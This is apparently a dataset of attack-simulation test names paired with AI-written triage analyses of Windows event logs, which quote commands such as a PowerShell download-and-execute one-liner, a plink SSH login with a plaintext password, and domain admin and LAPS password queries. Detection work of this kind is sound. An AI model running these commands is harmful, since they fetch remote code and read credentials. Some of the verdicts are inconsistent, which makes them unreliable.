   - `CompatTelRunner.exe` is seen used multiple times. Although this process is part of Windows telemetry, its excessive use alongside the PowerShell activity might be suspicious, especially if the environment does not have telemetry explicitly enabled or if the activities align with known compromise patterns.

3. **Admin Account Activity**:
   - Activities involving ""admin_test"" are observed, including privilege assignments and process executions related to PowerShell, which need scrutiny to verify if the actions were legitimate administrative tasks.

4. **Microsoft Edge Update and Setup Executions**:
   - A series of processes related to Microsoft Edge updates (e.g., setup.exe executions) are observed, some of which include arguments for verbose logging and system-level installations. This could be typical during an update cycle, yet, if unscheduled, it might warrant ensuring that the updates are valid and not part of a masquerading threat actor's operations.

5. **Presence of Suspicious Domains**:
   - Analysis showed repeated mentions of what seems like enumeration or connection efforts, potentially indicating an attempt to gain more information on the environment (`Get-AzDomainInfo.ps1`).

6. **Account Logon and Privilege Elevation Events**:
   - Several security audit events point to various logon activities and privileges being exercised by the SYSTEM and ""admin_test"" accounts. The exploitation of privileges like `SeDebugPrivilege` could allow for manipulation or introduction of high-privilege processes.

**Assessment**:
The logs contain numerous indications of potentially suspicious activities that need further investigation to rule out compromise. A focus should be on the roles of the accounts involved, the legitimacy of the PowerShell commands, the necessity of the telemetry processes, consent to the update activities observed, and verifying if they align with known safe patterns.

**Resolution**: **SUSPICIOUS** - Current activities require further investigation to confirm their nature and legitimacy. It is recommended to cross-reference these logs with policy compliance and expected administrator activities, and possibly execute containment or deeper forensic analysis if unauthorized actions are confirmed."
WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors,"### Detailed Analysis:

1. **PowerShell Activity:**

   - A significant red flag is raised from the PowerShell logs and Sysmon logs indicating the execution of a PowerShell command that leverages `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/master/scriptBinaries/Invoke-script.ps1')`. This is indicative of downloading and executing a script from an external source using PowerShell, which is a common tactic used in malicious activities.

   - The execution of the command `Invoke-script -command ""audit""` is potentially a form of reconnaissance or further exploitation after the script is downloaded.

2. **Sysmon Process Creation:**

   - Multiple instances of processes such as `whoami.exe`, `hostname.exe`, and `conhost.exe` being launched under the context of `SERVER002\admin_test` are observed, which indicates potential enumeration activity or preparation for privilege escalation. These tools can be used within scripts to gather system-level information.

   - The PowerShell process launched under a high-integrity context is of concern and aligns with the observed suspicious network-based script execution.

3. **Edge Update Processes:**

   - Activity related to `MicrosoftEdgeUpdate.exe` and related components launching from temporary directories can be suspicious, particularly if these are not regularly scheduled updates. These processes are executed by `NT AUTHORITY\SYSTEM`, which is a legitimate and high-privileged context, but the presence of related temporary files should be further examined to ensure this is benign system or software behavior and not exploited by malicious actions.

4. **System and Security Services:**

   - The presence of Time Service events, svchost.exe adjustments, and general kernel activities suggest nominal operating system behavior. However, these could potentially be manipulated in a time-based attack, although there is no direct evidence from the logs provided.

### Assessment and Resolution:

- **Assessment:**
  - The execution of potentially malicious PowerShell activity (referencing external scripts) is a strong indicator of potential malicious activity.
  - The observed combination of legitimate Windows utilities typically used for enumeration or information gathering, coupled with PowerShell commands known for misuse in downloading and executing scripts from unsecured sources, raises suspicion.

- **Resolution: MALICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Quarantine the system from the network to prevent further potential spreading or data exfiltration.
   - Perform detailed forensic analysis on the server, particularly focusing on the downloaded script and any resultant files or changes in the system.
   - Investigate the server's firewall and network logs to determine if unauthorized data was transmitted or further malicious scripts have been executed.

2. **Long-term Recommendations:**
   - Implement stricter controls on script execution policies and network traffic monitoring for PowerShell activities.
   - Employ application whitelisting to prevent the execution of unauthorized programs, especially those initiated from PowerShell with internet access.
   - Conduct regular training sessions on advanced persistent threats (APT) and simulate attack scenarios to enhance readiness against similar threats.

Reviewing this information comprehensively should lead to appropriate threat mitigation actions ensuring the organization's security posture is maintained."
Enumerate logged on users via CMD (Domain),"Upon reviewing the provided event logs from the Windows system, here's a detailed breakdown of the findings:

1. **Time Synchronization Events**:
   - The logs include a number of events related to time synchronization and time changes initiated by the `svchost.exe` process. This is captured in both the System and Security logs with Event ID 24 and 4616 respectively. These events appear to be routine and are associated with `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Time-Service`. These are standard behaviors and do not suggest malicious activity.

2. **Process Executions**:
   - The sysmon logs (Event ID 1 and 5) show frequent execution of commonly used Windows utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `cmd.exe`, and `whoami.exe`. The executions seem to originate from a user `SERVER002\admin_test`, indicating activity by an admin user. However, the frequent use of `cmd.exe` and `whoami.exe` is worth noting as it can indicate reconnaissance activities; however, they are not proof of malicious behavior in isolation.
   - There are multiple instances of `MicrosoftEdgeUpdate.exe` and related processes being executed. The commands related to Edge Update processes seem standard for application updates, particularly given they originate from the `NT AUTHORITY\SYSTEM` context.

3. **Edge Update Activity**:
   - Most of the application-related activities involve `MicrosoftEdgeUpdate.exe`, which are observed updating components of Microsoft Edge. Given that it runs under `NT AUTHORITY\SYSTEM` and involves various update service operations, this aligns with normal behavior for software updates.

4. **Conclusion**:
   - **BENIGN**: The logs do not contain direct indicators of compromise or malicious activity. The events and process behaviors observed are consistent with standard Windows operations, time synchronization, frequent administrative command-line activities by a known admin account, and legitimate software updates for Microsoft Edge.
   - While there is activity that could be seen as reconnaissance (use of `cmd.exe` and `whoami.exe`), there is no contextual information or external communication that suggests these are being used for malicious purposes.
   - It is advisable to review the context of admin activities if there are concerns about potential misuse, particularly ensuring the activity aligns with expectations of admin duties.

For continued security assurance, it's recommended to keep monitoring network traffic and user activities, and ensure regular updates and patches are applied to all software, including edge components."
WMIObject Group Discovery,"After analyzing the provided Windows event logs, here is a detailed assessment:

### Suspicious Behavior Observed:
1. **PowerShell Activity:**
   - The logs show that the PowerShell command `Get-WMIObject Win32_Group` was executed. This is commonly used to enumerate system group information and can be legitimate, but in certain contexts, it might be indicative of reconnaissance activities by an attacker.

2. **Sysmon Logs:**
   - The execution of `whoami.exe`, `hostname.exe`, and `wevtutil.exe` were observed.
     - `whoami.exe` is used to check current logged-in user information, which might be legitimate. However, it is often used in post-exploitation scenarios to identify user privileges.
     - `wevtutil.exe` is a tool used to manage Windows Event logs. It can be used for legitimate purposes, but can also be employed by an attacker to clear logs or track user activity.

3. **Security Logs:**
   - Several logon events (ID 4624) using NTLM were recorded.
   - Privileges consistent with admin-level access were granted, which include SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, and others. While this matches typical behavior for an administrative user, it might suggest privilege escalation if it’s an unrecognized account.
   - The user, `admin_test`, is observed performing activities with high privileges. If this account is unexpected or not regularly monitored, it should be considered suspicious.

### Indicators of Potential Malicious Activity:
- The combination of PowerShell script execution with user enumeration, along with access to event utility tools, may suggest an adversary is present and conducting internal reconnaissance or attempting to manipulate or view system information.

### Assessment:
- **Resolution: SUSPICIOUS**

### Threats or Risks:
- Possible reconnaissance activity and attempting to assess user privileges/activity. Such actions might precede more harmful behavior such as privilege escalation or data exfiltration.

### Guidance on How to Proceed:
1. **Verify User Account:**
   - Confirm if `admin_test` is a known and authorized account.
   - Check recent activities by this account to identify any anomalies.

2. **Investigate PowerShell and Command Utilization:**
   - Review broader logs and system activity for other unauthorized PowerShell usage.
   - Monitor any attempts to use `wevtutil` for malicious behavior.

3. **Implement Enhanced Monitoring:**
   - Increase log verbosity temporarily on critical systems to capture any further suspicious activity.
   - Enable logging and alerts for the usage of critical system tools like PowerShell and `wevtutil`.

4. **Restrict or Audibly Alert High Privileges:**
   - Audit privilege levels of all users and ensure least privilege principles are enforced.
   - Set alerts for the granting of privileges such as `SeDebugPrivilege`.

By following these steps, your organization can better assess whether the detected activities are legitimate or part of a potential compromise."
Security Software Discovery - Windows Defender Enumeration,"Let's analyze the provided Windows event logs for any indicators of suspicious or malicious activity:

### PowerShell Logs
- **Incident**: Multiple entries indicate the execution of PowerShell commands using `powershell.exe` to check the status of Windows Defender services and potential threats.
- **Assessment**: While these commands (such as `Get-Service WinDefend`, `Get-MpComputerStatus`, and `Get-MpThreat`) are used for legitimate security checks, frequent execution or execution in an unusual context can indicate reconnaissance or preparation for disabling security features by an attacker.

### System Logs
- **Time Changes**: The logs show time adjustments using `svchost.exe`, which is a legitimate process, but these changes could represent attempts to confuse time-based analysis.
- **Assessment**: Time changes by `svchost.exe` are not uncommon, especially if the system clock aligns with an NTP server; however, manual changes warrant further scrutiny to ensure they were authorized.

### Security Logs
- **Time Information**: Repeated adjustments to the system time were logged. Unauthorized time changes can lead to difficulties in tracking events and may hint at attempting to manipulate event chronology.
- **Assessment**: If accompanied by suspicious activity, this could be cause for concern, but on its own, these logs do not indicate malicious behavior conclusively.

### Sysmon Logs
- **Process Executions**: Multiple instances of `MicrosoftEdgeUpdate.exe` are seen, which is typical for legitimate updates. Some processes like `whoami.exe` and `hostname.exe` could be used to gather information about the system, which by themselves are not necessarily suspicious.
- **Assessment**: The frequent appearances of Edge update processes mixed with system utilities like `whoami.exe` and `hostname.exe` does not inherently imply malicious intent. However, if these utilities are not commonly used on this system, it could warrant a deeper look.

### Application Logs
- **Edge Updates and Services**: The logs show regular updates and services being stopped and started, which can be typical behavior for a system updating Microsoft Edge.
- **Assessment**: These activities seem consistent with benign system operations related to Microsoft Edge updates.

### Overall Assessment
- **Benign Observations**: The PowerShell commands, `WHOAMI`, `HOSTNAME`, and various Edge updates are common actions for system maintenance and updates.
- **Potentially Suspicious**: Time adjustments and the use of security check commands through PowerShell suggest potentially advanced operational awareness. They demand verification that these were legitimate administrative actions.
  
### Resolution: SUSPICIOUS
This environment displays some patterns that could be benign but need further investigation to rule out unauthorized access or the beginnings of a compromise. Verification of the actors involved, the context of system time changes, and process executions in their usual operational context should be performed. Logging of administrator activity around these events can clarify intent and legitimacy."
Basic Permission Groups Discovery Windows (Domain),"**Analysis of Windows Event Logs:**

1. **PowerShell Log:**
   - No entries were provided. Generally, PowerShell activities, especially scripts executed with obfuscation or scripts launching unexpected executables, could be indicators. However, without data, no conclusion can be drawn.

2. **Application Log:**
   - **EventID 16384:** Indicates an operation or event associated with the Software Protection Platform Service by Microsoft. This log relates to routine licensing operations and gives no indication of malicious activity.

3. **Security Log:**
   - **EventID 4616:** This event represents the system time change. It shows that the time was updated twice at very close intervals. While frequent time adjustments might suggest tampering, this could also be due to time synchronization operations, which are common and necessary in enterprise environments. The absence of user-initiated changes or any elevation of privilege context here suggests benign activity.

4. **System Log:**
   - **Kernel-General and Time-Service Events:** These logs generally indicate updates or time synchronization processes. Multiple time changes aligning closely with security log events further suggest regular system time synchronization with time.windows.com. No evidence of unauthorized changes is present.

5. **Sysmon Log:**
   - Several events reveal process creation activities with the following observations:
     - **wevtutil.exe, conhost.exe, whoami.exe, hostname.exe, cmd.exe, net.exe/net1.exe**: These processes are executed by a user with high integrity level and run sequentially.
     - **Command with cmd.exe:** `""cmd.exe"" /c net localgroup & net group /domain & net group ""enterprise admins"" /domain & net group ""domain admins"" /domain""` - This command is often used to enumerate or manage group memberships. The execution of such a command can be suspect, especially if not typical for the user.
   - Execution of **network-related commands** under the `admin_test` user account could indicate an attempt to query sensitive user groups (enterprise admins, domain admins), often undertaken in reconnaissance for lateral movement or privilege escalation.

**Assessment:**
- The logs do not explicitly present any known malicious signature or 100% definitive malicious activity, but the combination of high-integrity command execution to list sensitive groups, especially without any context of validation with normal or behavior, should raise suspicion. 

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
1. **Further Investigation:** 
   - Monitor user `SERVER002\admin_test` for any unusual behavior, ensure their current activity aligns with their job role and responsibilities.
   - Review any recent changes in privilege or permissions related to this account.
2. **Security Measures:**
   - Audit command use policies for admin-level accounts.
   - Set alerts for similar command activities or process creations associated with admin accounts.
3. **Determine Context:**
   - Check if similar events are common in baseline operations or deviations.

Continuing with this approach will ensure that potential unauthorized reconnaissance attempts are detected early to prevent any exploit following reconnaissance."
ESXi - Enumerate VMDKs available on an ESXi Host,"After reviewing the provided Windows event logs from the Sysmon and Application channels, several key observations can be made regarding potential indicators of malicious activity:

1. **PowerShell Execution**: The first log entry indicates the execution of `powershell.exe` by the user 'SERVER002\\admin_test'. While the appearance of `powershell.exe` is not inherently malicious, it is often leveraged in malware attacks and lateral movement within a network. However, without additional context or a command line argument that indicates suspicious behavior, this by itself is not a definitive indicator of compromise.

2. **Use of `wsmprovhost.exe`**: This process is associated with Windows Remote Management (WinRM). The logs show that `whoami.exe` and `cmd.exe` were executed with `wsmprovhost.exe` as a parent process. This could suggest administrative actions are being performed remotely. Again, although this can be legitimate, it requires the context of usual behavior in the environment.

3. **Suspicious `cmd.exe` Command**: At log record `17996`, a concerning command line is constructed using `cmd.exe` which involves `plink.exe`. This tool is part of the PuTTY suite used for SSH connections. The command is attempting to connect to `file.local` with the `root` user, using a password (`-pw ""pass""`) and a script (`-m ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\esxi_file_discovery.txt""`). This behavior is highly suspicious as it indicates unauthorized data collection and exfiltration via SSH to an unknown server.

4. **Frequent Use of `conhost.exe`**: Numerous instances of `conhost.exe` appear, typically associated with legitimate `cmd.exe` activities. However, given the suspicious usage of `cmd.exe` mentioned above, it raises concern about whether these instances are part of malicious automation.

5. **Routine Edge Update Operations**: A significant number of logs pertain to update processes of Microsoft Edge. These logs with `MicrosoftEdgeUpdate.exe` processes frequently execute as `NT AUTHORITY\\SYSTEM`. There's no apparent anomaly here; software update processes are common and necessary.

**Conclusion and Resolution**: Based on the analysis, there are clear signs of potentially malicious activity, especially centered around the use of `cmd.exe` with `plink.exe` for SSH operations, suggesting unauthorized remote data access or exfiltration attempts.

**Resolution**: MALICIOUS

**Guidance**:
- Isolate the affected host (Server002) immediately to prevent further potential exfiltration or interaction with the network from the identified suspicious processes.
- Conduct a thorough forensic examination of the host to assess any unauthorized changes, data tampering, or additional malicious artifacts.
- Reset credentials for 'SERVER002\\admin_test' and examine any other accounts with similar suspicious activities.
- Review network logs to identify if the destination `file.local` or any other external IPs have been contacted from this host.
- Implement tighter monitoring controls around PowerShell and command line executions to detect similar activities in the future."
WinPwn - spoolvulnscan,"### Analysis Summary

Based on the provided Windows event logs, the following key observations and analysis have been conducted:

1. **Use of `wevtutil.exe` and `conhost.exe`:** The frequent invocation of `wevtutil.exe` and `conhost.exe` by the admin user (`SERVER002\admin_test`) is noted. While these processes can have legitimate uses, repeated or automated launches in close succession could indicate activity worth further scrutiny. However, without further context, these alone do not immediately suggest malicious activity.

2. **Command Line with `whoami.exe` and `hostname.exe`:** The execution of simple diagnostic commands like `whoami.exe` and `hostname.exe` by the admin is noted. These commands are often used for information gathering but are benign in nature unless followed by suspicious sequences, which is not evident in this case.

3. **Suspicious PowerShell Activity:** 
   - **Event Entries:** High-integrity level execution of PowerShell with a command-line including script downloading and execution (`iex(new-object net.webclient).downloadstring`).
   - **Content:** The script is sourced from a public GitHub repository, which raises concerns about potential execution of untrusted or malicious code.
   - **Potential Impact:** This is a common method leveraged by attackers to achieve remote code execution/payload delivery.

4. **Additional Processes and Services:**
   - Instances of system-related processes like `svchost.exe`, `MicrosoftEdgeUpdate.exe`, `WmiPrvSE.exe`, `sppsvc.exe`, and others running under `NT Authority` accounts appear to reflect normal system operations.
   - No indicators of privilege escalation or unauthorized execution associated with sensitive processes stand out within the logs.

5. **Time Discrepancies:**
   - There are alterations in system time noted in the log entries. However, this often happens due to regular system time synchronization events and does not by itself indicate malicious behavior unless corroborated by other suspicious activity.

### Conclusion

Based on the observed activities:
- **PowerShell Activity** stands out as suspicious due to external script downloading and execution without clear authorization or known justification within typical administrative duties.

Given this analysis:
- **Resolution:** SUSPICIOUS

### Recommendations

- **Immediate Investigation:** Initiate a thorough investigation into the suspicious PowerShell activity. Determine the purpose of the script, its origin, and its impact on the system.
- **User Confirmation:** Contact the legitimate owner `admin_test` to verify if they executed the PowerShell script intentionally. Review their account activity for any signs of compromise.
- **Network Monitoring:** Look for any network anomalies involving the host in question, particularly around the time of the PowerShell execution.
- **Endpoint Security:** Ensure the system's antivirus/endpoint protection is functional and performing regular scans. Check for any alerts on this machine.
- **Script Analysis:** Download and analyze the script referenced in the PowerShell execution lines for malicious intent or actions.

Until the investigation concludes, consider isolating the host, or specifically restricting PowerShell execution, to prevent potential misuse."
Enumerate COM Objects in Registry with Powershell,"Upon analyzing the provided Windows event logs, here is the detailed assessment:

### System Log Analysis:

The system log entries primarily document activities related to Windows Update and Distributed COM (DCOM) operations. The events show Microsoft Defender Antivirus updates, which are regular activities. DCOM Event ID 10010 indicates a potential issue with a DCOM component, which may be benign unless correlated with suspicious activity in other logs.

### Security Log Analysis:

1. **Event ID 5379** appear multiple times, which relate to credential manager operations, indicating attempts to retrieve credentials. The attempts are associated with XboxLive and MicrosoftAccount. The ReturnCode 3221226021 denotes an error or failure in these operations—often related to insufficient permissions or incorrect conditions.

2. **Event ID 4624**: Logs numerous successful logins with LogonType 5, which indicates a service logon. These are expected for system activities.

3. **Event ID 4672**: Refers to special privileges assigned during startup, such as SeDebugPrivilege. While normal for system accounts, if seen with non-system accounts, it can indicate risk.

The presence of an admin_test account with Event ID 4672 indicates higher privileges, but without explicit signs of malicious escalation.

### Application Log Analysis:

Application log events denote that Windows Defender is active and security protections are operating as expected.

### PowerShell Log Analysis:

PowerShell log activities are indicative of script execution involving registry manipulation, possibly aimed at querying or modifying registry keys under `HKEY_CLASSES_ROOT`. The command lines reference `Get-ChildItem`, `Get-Content`, and `write-output` operations commonly seen in system auditing but could be a concern if unauthorized.

### Sysmon Log Analysis:

1. Numerous processes related to standard system operations like `svchost.exe`, `conhost.exe`, and others are recorded. 

2. Notably, there are entries showing `Hostname.exe`, `whoami.exe`, and `powershell.exe` executions, suggesting system enumeration activities, typically benign or part of administrative tasks unless combined with unauthorized access.

3. `PowerShell` is used in conjunction with registry operations at elevated privileges. If unauthorized, this could indicate potential registry mining or manipulation.

4. `MicrosoftEdgeUpdate.exe` and related processes run under the `NT AUTHORITY\SYSTEM` account, corresponding to legitimate update processes.

### Assessment:

- **Unusual Patterns**: While many logged activities appear regular, the repeated attempts to access credential manager and elevated privilege operations by `admin_test` should be noted as potential concerns.
- **PowerShell Activity**: The registry and file operations indicate a deeper system exploration, unusual for a standard user unless for system maintenance.
- **No Clear Malicious Activity**: There are no clear indicators of malware execution or explicit compromise within these logs.

### Resolution:

**SUSPICIOUS**: The event logs contain activities that warrant further investigation due to irregular use of credentials, potential unauthorized access, and elevated privilege operations.

### Guidance:

1. **Investigate 'admin_test' activities**: Validate these operations were authorized and part of expected administrative tasks.
2. **Audit Powershell Scripts**: Validate the source and necessity of the executed PowerShell scripts.
3. **Review DCOM Configurations**: Verify the security posture concerning DCOM to ensure no vulnerabilities.

This case remains categorized as suspicious and necessitates more information before any final determination. Continued monitoring and detailed review of user account activities, especially those relating to `admin_test`, are recommended."
Windows MachineGUID Discovery,"Upon reviewing the provided Windows event logs, several points require detailed analysis:

1. **Sysmon Log Analysis:**
   - Numerous executions of common Windows system utilities (`whoami.exe`, `wevtutil.exe`, `hostname.exe`) and processes (`cmd.exe`, `conhost.exe`, `reg.exe`) are observed.
   - The execution of `cmd.exe` with the command line `REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid` stands out. This is concerning because querying the machine GUID might be leveraged for identification by malware or as a reconnaissance step by an attacker.
   - Frequent use of `wevtutil.exe` is noted. While this tool is used for managing Windows Event logs, its repeated execution might indicate log tampering or clearing, which are common in malicious activities to cover tracks.

2. **System and Security Log Analysis:**
   - Event ID 4616 in the Security log indicates system time change events, which are considered highly suspicious. Changing system time could be an attempt to spoof logs or bypass security mechanisms reliant on timestamps.
   - Related entries in Kernel-General events also reflect time changes, reinforcing the potential for malicious intent.

3. **General Observations:**
   - The use of `wsmprovhost.exe` as the parent process suggests the activity might be originating from a Windows Remote Management (WinRM) session, which can be exploited for remote access by attackers.
   - High Integrity Level executions indicate these processes are being run with elevated privileges, which could lead to further compromise if leveraged by an attacker.

The combination of frequent, elevated access to command line tools, system time adjustments, and potential remote management usage strongly suggests suspicion of unauthorized or malicious activity within these logs.

**Assessment and Conclusion:**
Given the observed behavior:
- System time changes indicate potential log tampering.
- Registry queries and usage of `wevtutil` suggest possible reconnaissance and anti-forensics actions.
- Use of elevated privileges could suggest an attempt to gain or maintain unauthorized access.

**Resolution:** SUSPICIOUS

**Recommended Actions:**
1. **Immediate Investigation:** Conduct a thorough investigation into the origin and context of these activities. Check if any remote connections are legitimate or sanctioned.
2. **Monitoring & Alerts:** Set up alerts for further instances of `wevtutil`, `wevtutil` usage, and system time changes.
3. **Containment:** Consider isolating the host from the network until a full incident response can be conducted.
4. **Forensic Analysis:** Perform a detailed forensic analysis on the system to identify any signs of compromise or exfiltration.

Further investigation is needed to determine the exact nature and intent of the activities reflected in these logs."
Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property,"Upon analyzing the provided Windows event logs, we can break down the observations into various categories from the System, Security, Windows PowerShell, Sysmon, and Application logs.

### System Logs:
- These logs primarily indicate the synchronization or modification of the system time on Server002. The presence of `svchost.exe` carrying out these changes is typically associated with time synchronization processes, such as Windows Time Service adjusting the system clock. This is usually benign if confirmed to be part of time synchronization activity.

### Security Logs:
- Event ID 4616 shows changes in system time, conducted by `svchost.exe` with the user `LOCAL SERVICE`. This might be related to the same time synchronization activities observed under System Logs. Unless there’s evidence of tampering or logs occurring under suspicious user accounts, this would be considered benign.

### Windows PowerShell Logs:
- The PowerShell logs indicate that PowerShell sessions were started with a scripted command involving `ms-Mcs-AdmPwd` and `ms-Mcs-AdmPwdExpirationTime` properties. These commands can be related to querying or managing Local Administrator Password Solution (LAPS) passwords, which are managed by Active Directory. While this is commonly used in enterprise environments for administrative purposes, its presence here is non-typical if no recent administrative tasks related to LAPS were expected. Therefore, this should be marked as **SUSPICIOUS** if not anticipated operationally.

### Sysmon Logs:
- The Sysmon logs reveal multiple instances of legitimate Microsoft software, such as `wevtutil.exe`, `conhost.exe`, and `MicrosoftEdgeUpdate.exe`, all executed under `SERVER002\admin_test`. The pattern of execution and known software/versions do not immediately suggest malicious activity. However, administrative tasks and interactions with system processes, particularly by `admin_test`, should be accounted for operationally.
  
- The execution of `whoami.exe` and `hostname.exe` could indicate enumeration activities, typically benign but might be perceived suspicious if not performed by IT or without context (e.g., troubleshooting, machine audit). It could warrant a **SUSPICIOUS** designation if these processes were unexpected given the timing and user.

### Application Logs:
- These logs include routine application stops (`edgeupdate` services) and regular activities across software components. They don’t provide immediate indicators of compromise or unusual application behavior.

### Overall Assessment:
- **BENIGN**: The majority of the events correspond to expected system operations, including time synchronization and software updates.
- **SUSPICIOUS**: The unanticipated use of PowerShell to access LAPS properties and possible system enumeration activities via `whoami.exe` should be investigated further.

**Resolution**: **SUSPICIOUS**

### Recommendations:
1. Review PowerShell activity logs to identify if the LAPS information was accessed for valid administrative reasons.
2. Verify with the endpoint user `admin_test` and relevant IT staff whether the actions related to potential enumeration (`whoami.exe` executions) were part of scheduled tasks or troubleshooting actions.
3. Consider implementing enhanced monitoring and alerts for scripts and commands involving LAPS properties to catch and verify unauthorized access rapidly.
4. Confirm scheduled tasks or system audits correlating with logs showing multiple executions of processes under `admin_test` to prevent false positives in future monitoring."
Examine domain password policy - Windows,"Upon analyzing the provided Windows event logs, several observations emerge regarding potential indicators of compromise or malicious activity:

### System Logs Analysis:
1. **Time Changes:**
   - The logs indicate system time changes by `svchost.exe` with EventID `4616` in the security log and EventID `1` in the system log. This could be part of normal Windows operations, such as time synchronization, but warrants cautious examination since malicious activities sometimes involve altering system time.

### Security Logs Analysis:
2. **Admin User Logon and Privilege Escalation:**
   - The user `admin_test` is seen logging in with EventID `4624` (logon success) using `NTLM`, from what appears to be an external source (`DESKTOP-3HL5B2P`) with an IPv6 address.
   - The same user receives special privileges corresponding to EventID `4672`, including potentially sensitive privileges like `SeDebugPrivilege`, typically reserved for administrative tasks. While these privileges might be normal for an admin user, their occurrence immediately after a logon event suggests that increased scrutiny is warranted to rule out misuse.

3. **Logon Type 3:**
   - Logon Type `3` indicates a network logon, which might be legitimate admin activity from a remote desktop session. However, correlating this with external IP addresses and privilege escalation flags the need for further investigation.

### Sysmon Logs Analysis:
4. **Process Execution Patterns:**
   - Several executions of `wevtutil.exe`, `conhost.exe`, and utilities like `whoami.exe` and `hostname.exe` by the `admin_test` user suggest potential reconnaissance activity or administrative scripting.
   - The execution of `cmd.exe` with the command `net accounts /domain` and its subsequent child process `net.exe` might be part of a script or manual interrogation, which under certain contexts may signal malicious reconnaissance or lateral movement attempts.

5. **Service Execution:**
   - The execution of system services `svchost.exe`, `sppsvc.exe` (Software Protection Platform Service), and `MicrosoftEdgeUpdate.exe` is likely benign, aligning with routine operations.

### Conclusion and Recommendations:
- **Resolution: SUSPICIOUS**
  - While many events could be benign administrative activities, the combination of logon events over the network with immediate high privilege allocations, systemic queries, and the use of command-line tools hints at potentially unauthorized access or reconnaissance behavior.
  - **Recommendations:**
    - Verify the legitimacy of the `admin_test` user's activity with the user or IT department, specifically regarding the timing and origin of the logons.
    - Review associated systems for further signs of unauthorized changes or access, emphasizing command history and script execution.
    - Implement or update monitoring alerts for unusual use of administrative tools, privilege escalations, and time adjustments.
    - Consider isolating affected systems while investigations continue and ensure patches and security best practices are followed."
Use of SecEdit.exe to export the local security policy (including the password policy),"To assess the provided Sysmon logs accurately, let's break down the activities and highlight points that may imply benign, suspicious, or malicious behavior. 

### Overview of the Provided Sysmon Logs:

1. **Edge Update Processes:**
   - There are several logs associated with the `MicrosoftEdgeUpdateComRegisterShell64.exe` and `MicrosoftEdgeUpdate.exe` processes. These entries show ongoing update operations, which are generally expected activities for keeping software like Microsoft Edge up-to-date.
   - Execution of these processes under `NT AUTHORITY\SYSTEM` is typical for system maintenance tasks.

2. **Routine Operational Commands:**
   - Execution of `whoami.exe`, `hostname.exe`, and other system-related binaries such as `conhost.exe` are observed. These could be indicative of a user or a script querying system information, which may not necessarily be malicious.
   
3. **Command-Line Executions:**
   - A noteworthy command `cmd.exe` with arguments to run `secedit.exe` for exporting security policies raises interest. Often, such actions could suggest a user or script obtaining configuration settings for review or modification, which may warrant deeper context-specific investigation.

4. **Presence of `wevtutil.exe`:**
   - Frequent execution of the `wevtutil.exe` utility implies actions related to Windows Event Logs. It's often used for export, deletion, or cleanup operations in scripts or under administrative tasks. If there's no context provided that aligns with maintenance activities, repeated executions can be potentially suspicious — especially if unexpected.

### Assessment of Threat/Anomaly:

- **Benign Indicators:**
  - Activities involving Microsoft Edge Updates are routine for system upkeep.
  - Commands like `whoami.exe` or `hostname.exe` queries are common for scripts checking system environment or initiated by users/admins performing diagnostics.

- **Suspicious Indicators:**
  - The `secedit.exe` usage, while normal under specific contexts, needs clarification on why security policy exports happen, especially in a temporary directory.
  - Export operations with `wevtutil.exe`, if unauthorized or unforeseen, might hint at log tampering or prelude to hiding actions on the system.

### Conclusion and Guidance:

Based on the logs seen, the activities performed mostly align with system updates and standard administrative or diagnostic operations. However, the frequent utilization of `wevtutil.exe` to interact with event logs, alongside potential security policy exports, requires additional scrutiny, especially in environments where such actions should be tracked or validated against planned maintenance or incident response activities.

**Resolution: SUSPICIOUS**

### How to Proceed:
- **Verify Changes**: Consult configuration management or system maintenance records to verify if the observed actions are authorized.
- **Investigate the Context**: Understand who initiated tasks involving `secedit.exe` and `wevtutil.exe`, and confirm if they match usual administrative protocols.
- **Harden Logging**: Ensure that logging activities are tracked, including access to security logs, to prevent misuse.
- **Monitor and Review**: Keep a close watch on subsequent logs for any continuation or escalation of these actions, reverting them if necessary.

Reaffirm that all activities are aligned with organizational policy and user roles to ensure no anticipated threat bypasses normal monitoring thresholds."
System Discovery using SharpView,"Based on the analysis of the provided Windows event logs, there are several indicators of potentially suspicious activity that warrant further investigation. Here's a detailed breakdown:

### Suspicious Activities Detected:

1. **Powershell Execution with External File Access**:
   - A **PowerShell process** (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) was executed by the user `SERVER002\admin_test` at `2024-10-22 16:28:01.5317856` with a command line that suggests script execution with `SharpView.exe`. The command attempts to invoke various PowerShell functions related to Active Directory enumeration or reconnaissance activities, such as ""Invoke-ACLScanner"", ""Invoke-script"", and ""Find-DomainShare"".
   - The `SharpView.exe` tool is known for its utility in collecting information from Active Directory environments and is often used in post-exploitation scenarios by attackers.

2. **Frequent Process Starting with Conhost.exe**:
   - There are several events where `conhost.exe` (Console Window Host) is started, which is typical when a command-line tool is used. The high frequency and conjunction with suspicious PowerShell activity raise concerns of command execution possibly tied to the activities of malicious scripts or tools.

3. **Repeated Use of `wevtutil.exe`**:
   - The `wevtutil.exe` tool is used to manage and query Windows event logs. Frequent invocation could indicate attempts to manipulate or clear logs to cover tracks.

4. **System-Level Execution and Privilege Escalation**:
   - The consistent appearance of `SYSTEM` account usage across events, particularly event IDs like 4672, which denote assignment of special privileges, could indicate an attempt to use elevated privileges in an unauthorized manner.

5. **Access to and Use of Built-in Administrative Tools**:
   - The use of tools like `wevtutil.exe`, `HOSTNAME.EXE`, `whoami.exe`, and the high-integrity logins suggest potential reconnaissance activities or a privilege escalation attempt using built-in Windows utilities.

### Benign Activities Detected:

1. **Routine System Processes**:
   - Processes such as `CompatTelRunner.exe`, `taskhostw.exe`, and others related to system updates (e.g., `MicrosoftEdgeUpdate.exe`, `DeviceCensus.exe`) appear to be consistent with regular Windows operations and telemetry tasks.

2. **Windows Defender**:
   - Continuously reported as being active (`SECURITY_PRODUCT_STATE_ON`), which suggests no obvious tampering with built-in security features.

### Assessment:

